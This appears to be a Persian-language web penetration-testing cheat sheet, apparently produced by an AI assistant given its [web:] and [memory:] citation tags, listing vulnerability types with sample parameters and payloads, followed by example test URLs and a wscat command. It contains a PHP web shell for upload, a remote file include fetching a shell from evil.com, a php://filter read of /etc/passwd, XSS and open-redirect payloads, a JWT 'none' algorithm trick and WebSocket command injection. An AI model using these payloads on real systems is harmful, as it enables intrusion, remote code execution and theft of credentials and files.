| آسیب‌پذیری              | پارامتر/URL نمونه                          | Payload نمونه                                                                                  |
|---------------------------|--------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Hardcoded Credentials** | config.js, .env, /api/config, settings.json| `api_key: sk-...`, `password: admin123`, `secret: abc123`, `DB_PASSWORD=pass` [web:17][web:34] |
| **Sensitive Info Leak**   | /logs, /debug, /backup, error?details=true | `?debug=true`, `?info=1`, `/error?trace=1`, grep `key\|pass\|token` در response [web:17][web:26] |
| **IDOR Candidate**        | /user?id=123, /profile/456, /doc/789      | `/user?id=124`, `/user?id=1`, `/user?id=-1`, `/user?id=999999` [web:21][memory:15]             |
| **Open Redirect**         | ?redirect=, ?next=, ?url=, ?return_to=    | `?redirect=https://evil.com`, `?next=//evil.com`, `javascript:alert(1)` [web:25][memory:7]     |
| **Upload Endpoint**       | /upload, /file, /avatar, /profile-pic     | `shell.php` با `<?php system($_GET['cmd']); ?>`, `.htaccess` upload [web:30]                     |
| **WebSocket Endpoint**    | ws://example.com/ws, /socket.io/          | `ws://evil.com/ws`, `{"auth":"admin","cmd":"whoami"}`, `{"method":"eval","code":"alert(1)"}` [web:27] |
| **RFI/RCE Hint**          | ?include=, ?file=, ?template=, ?remote=   | `?file=http://evil.com/shell.txt`, `php://filter/read=convert.base64-encode/resource=/etc/passwd` [web:18] |
| **DOM XSS Sink**          | ?hash=, #anchor, ?q=, ?search=            | `#<img src=x onerror=alert(1)>`, `javascript:alert(document.domain)`, `data:text/html,<script>alert(1)</script>` [web:28] |
| **Service/Endpoint Map**  | /api/v1/, /.well-known/, /admin/, robots.txt | `GET /.git/config`, `OPTIONS /api/`, `GET /api/v2/` [web:22]                                    |
| **JWT/API Keys**          | Authorization: Bearer, ?token=, ?api_key= | `eyJhbGciOiJub25lIn0.`, `token=sk_live_...`, `none` algorithm در jwt.io [web:22][memory:9]     |




---
# مثال تست Open Redirect
https://target.com/login?redirect=https://evil.com
https://target.com/home?next=javascript:alert(1)

# مثال IDOR
https://target.com/user/123 → https://target.com/user/124

# مثال DOM XSS
https://target.com/search#<svg onload=alert(1)>

# WebSocket
wscat -c ws://target.com/ws
> {"cmd":"whoami","auth":"admin"}
